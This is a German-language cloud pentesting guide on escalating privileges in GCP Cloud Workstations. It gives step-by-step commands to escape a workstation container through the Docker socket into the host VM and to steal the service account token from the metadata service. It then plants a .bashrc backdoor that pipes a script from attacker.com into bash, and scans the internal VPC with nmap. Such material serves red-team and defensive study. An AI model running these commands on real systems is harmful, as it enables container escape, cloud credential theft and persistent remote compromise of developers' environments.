# GCP - Cloud Workstations Privesc


### Container Breakout via Docker Socket (Container -> VM -> Project)

Der primäre Privilegien-Eskalationspfad in Cloud Workstations ergibt sich aus der Notwendigkeit, **Docker-in-Docker (DinD)**-Workflows für Entwickler zu unterstützen. Wenn die Workstation-Konfiguration das Docker socket einbindet oder privilegierte Container erlaubt (eine häufige Konfiguration), kann ein Angreifer innerhalb des Workstation-Containers auf die zugrunde liegende Compute Engine VM entkommen und das Service-Account-Token stehlen.

**Voraussetzungen:**
- Zugriff auf ein Cloud Workstation-Terminal (per SSH, kompromittierte Sitzung oder gestohlene Anmeldedaten)
- Die Workstation-Konfiguration muss `/var/run/docker.sock` mounten oder privilegierte Container erlauben

**Architekturkontext:** Die Workstation ist ein Container (Layer 3), der auf einer Docker/Containerd-Runtime (Layer 2) auf einer GCE VM (Layer 1) läuft. Das Docker socket gewährt direkten Zugriff auf die Container-Runtime des Hosts.

> [!NOTE]
> Das Tool [gcp-workstations-containerEscapeScript](https://github.com/AI-redteam/gcp-workstations-containerEscapeScript) automatisiert den vollständigen container escape und öffnet eine root shell auf der Host-VM.

<details>

<summary>Schritt 1: Überprüfen auf Docker socket</summary>
```bash
# Verify the Docker socket is available
ls -l /var/run/docker.sock
# Expected output: srw-rw---- 1 root docker 0 ...
```
</details>

<details>

<summary>Schritt 2: Escape to the host VM filesystem</summary>

Wir starten einen privileged container und mounten das Root-Verzeichnis des Hosts nach `/mnt/host`. Außerdem teilen wir das Netzwerk und den PID namespace des Hosts, um die Sichtbarkeit zu maximieren.
```bash
# Spawn a privileged container mounting the host's root filesystem
docker run -it --rm --privileged --net=host --pid=host \
-v /:/mnt/host \
alpine sh

# Inside the new container, chroot into the host
chroot /mnt/host /bin/bash
```
Du hast jetzt eine **root shell auf der zugrunde liegenden Compute Engine VM** (Layer 1).

</details>

<details>

<summary>Schritt 3: Steal the VM service account token from IMDS</summary>
```bash
# From the host VM, query the Instance Metadata Service
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Check which service account is attached
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Check scopes (CRITICAL STEP)
curl -s -H "Metadata-Flavor: Google" \
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes
```
</details>

> [!CAUTION]
> **Prüfe die Scopes!**
> Selbst wenn das angehängte Service Account **Editor** ist, kann die VM durch access scopes eingeschränkt sein.
> Wenn du `https://www.googleapis.com/auth/cloud-platform` siehst, hast du vollständigen Zugriff.
> Wenn du nur `logging.write` und `monitoring.write` siehst, bist du auf die **Network Pivot**- und **Persistence**-Vektoren weiter unten beschränkt.

<details>

<summary>Schritt 4: Persistence erreichen (Backdoor the User)</summary>

Cloud Workstations binden einen persistenten Datenträger unter `/home/user` ein. Da der Container-Benutzer (normalerweise `user`, UID 1000) mit dem Host-Benutzer (UID 1000) übereinstimmt, kannst du in das Home-Verzeichnis des Hosts schreiben. Damit kannst du die Umgebung backdooren, selbst wenn der Workstation-Container neu aufgebaut wird.
```bash
# Check if you can write to the host's persistent home
ls -la /mnt/host/home/user/

# Drop a backdoor that executes next time the developer logs in
# Note: Do this from the container escape context
echo "curl http://attacker.com/shell | bash" >> /mnt/host/home/user/.bashrc
```
</details>

<details>

<summary>Step 5: Network Pivot (Internal VPC Access)</summary>

Da Sie den Host-Netzwerk-Namensraum (`--net=host`) teilen, sind Sie jetzt ein vertrauenswürdiger Knoten im VPC. Sie können nach internen Diensten scannen, die Zugriff basierend auf IP whitelisting erlauben.
```bash
# Install scanning tools on the host (if internet access allows)
apk add nmap

# Scan the internal VPC subnet
nmap -sS -p 80,443,22 10.0.0.0/8
```
</details>
